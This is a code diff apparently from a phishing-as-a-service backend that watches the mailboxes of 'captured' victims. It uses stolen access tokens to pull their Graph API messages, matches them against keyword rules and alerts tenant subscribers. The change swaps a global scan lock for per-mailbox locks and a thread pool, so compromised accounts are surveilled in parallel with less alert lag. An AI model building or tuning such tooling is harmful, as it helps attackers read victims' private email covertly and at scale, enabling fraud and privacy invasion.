@@ -16,8 +16,45 @@ logger = logging.getLogger(__name__)
 BASE_DIR = Path(__file__).parent.resolve()
 SETTINGS_FILE = BASE_DIR / 'settings.json'
 
-# Global reentrant lock prevents background watcher, manual scan_now, and poller from racing
-_scan_lock = threading.RLock()
+# Per-session reentrant locks. A single global lock serialised every mailbox,
+# so a burst of captures queued up behind each other and alerts lagged by
+# minutes. Each mailbox now scans independently; only the same mailbox is
+# serialised (which is all the dedup ledger needs).
+_user_locks = {}
+_user_locks_guard = threading.Lock()
+
+# Scopes (owner partitions) with a bulk scan in flight. Replaces the old single
+# global "scan already in progress" flag so a manual scan of one tenant no
+# longer blocks the background daemon for every other tenant.
+_active_scopes = set()
+_scopes_guard = threading.Lock()
+
+# How many mailboxes may scan simultaneously.
+SCAN_CONCURRENCY = int(getattr(Config, 'SCAN_CONCURRENCY', 8))
+
+
+def _lock_for(user_code):
+    """Return the per-mailbox lock, creating it on first use."""
+    with _user_locks_guard:
+        lock = _user_locks.get(user_code)
+        if lock is None:
+            lock = threading.RLock()
+            _user_locks[user_code] = lock
+        return lock
+
+
+def _claim_scope(scope_key):
+    """Mark a scope as scanning. Returns False if it is already in flight."""
+    with _scopes_guard:
+        if scope_key in _active_scopes:
+            return False
+        _active_scopes.add(scope_key)
+        return True
+
+
+def _release_scope(scope_key):
+    with _scopes_guard:
+        _active_scopes.discard(scope_key)
 
 def load_settings():
     if SETTINGS_FILE.exists():
@@ -204,9 +241,11 @@ def fetch_graph_messages(access_token, top=50):
 
 def scan_victim_mailbox(session, rules=None):
     """Scan a single victim's new incoming emails against active keyword rules.
-    Thread-safe via _scan_lock. Filters out self-sent emails and deduplicates across folders using internetMessageId.
+    Serialised per mailbox via its own lock, so different mailboxes scan in
+    parallel. Filters out self-sent emails and deduplicates across folders
+    using internetMessageId.
     """
-    with _scan_lock:
+    with _lock_for(session.get('user_code')):
         user_code = session.get('user_code')
         victim_name = session.get('victim_name') or 'Unknown'
         victim_email = session.get('victim_email') or 'Unknown'
@@ -401,7 +440,9 @@ def _scan_sessions(sessions, rule_ids=None):
     """Core scan loop over an already-selected session list.
 
     Rules are resolved per owner so a tenant's rules only ever evaluate that
-    tenant's mailboxes. Caller must already hold _scan_lock.
+    tenant's mailboxes. Mailboxes are scanned in parallel (bounded by
+    SCAN_CONCURRENCY) — each is independently locked, so a burst of captures
+    no longer serialises into a multi-minute backlog.
     """
     captured = [s for s in sessions if s.get('status') == 'CAPTURED']
 
@@ -423,8 +464,19 @@ def _scan_sessions(sessions, rule_ids=None):
     total_emails_scanned = 0
     total_new_hits = 0
 
-    for s in captured:
-        res = scan_victim_mailbox(s, rules=_rules_for(s.get('owner_id')))
+    from concurrent.futures import ThreadPoolExecutor
+
+    def _one(s):
+        return scan_victim_mailbox(s, rules=_rules_for(s.get('owner_id')))
+
+    if captured:
+        with ThreadPoolExecutor(max_workers=min(SCAN_CONCURRENCY, len(captured)),
+                                thread_name_prefix='kwscan') as pool:
+            results = list(pool.map(_one, captured))
+    else:
+        results = []
+
+    for res in results:
         if res.get('status') == 'ok':
             total_scanned_accounts += 1
             total_emails_scanned += res.get('emails_scanned', 0)
@@ -445,11 +497,11 @@ def scan_all_victims(rule_ids=None, owner_id=None):
     "Run Scan Now" button scanned the whole platform and reported the admin's
     victims to a subscriber who owns none of them.
 
-    Uses _scan_lock to prevent concurrent scans from the background daemon
-    and the manual scan_now API from racing and dispatching duplicate alerts.
+    Uses per-scope claim flags to prevent concurrent scans of the same scope
+    from racing and dispatching duplicate alerts.
     """
-    acquired = _scan_lock.acquire(blocking=False)
-    if not acquired:
+    scope_key = ('owner', owner_id)
+    if not _claim_scope(scope_key):
         logger.info("[KEYWORD-WATCHER] Scan already in progress, skipping this cycle.")
         return {'status': 'skipped', 'message': 'Scan already in progress', 'scanned_accounts': 0, 'total_emails_scanned': 0, 'total_new_hits': 0}
 
@@ -460,19 +512,19 @@ def scan_all_victims(rule_ids=None, owner_id=None):
             sessions = db.get_all_sessions(owner_id=owner_id)
         return _scan_sessions(sessions, rule_ids=rule_ids)
     finally:
-        _scan_lock.release()
+        _release_scope(scope_key)
 
 def scan_platform(rule_ids=None):
     """Scan EVERY tenant partition — used by the background daemon so client
     mailboxes keep being watched while the admin console is idle."""
-    acquired = _scan_lock.acquire(blocking=False)
-    if not acquired:
+    scope_key = ('platform',)
+    if not _claim_scope(scope_key):
         logger.info("[KEYWORD-WATCHER] Scan already in progress, skipping this cycle.")
         return {'status': 'skipped', 'message': 'Scan already in progress', 'scanned_accounts': 0, 'total_emails_scanned': 0, 'total_new_hits': 0}
     try:
         return _scan_sessions(db.get_all_sessions(), rule_ids=rule_ids)
     finally:
-        _scan_lock.release()
+        _release_scope(scope_key)
 
 class KeywordWatcherThread(threading.Thread):
     """Continuous background daemon polling victim mailboxes for keyword matches."""
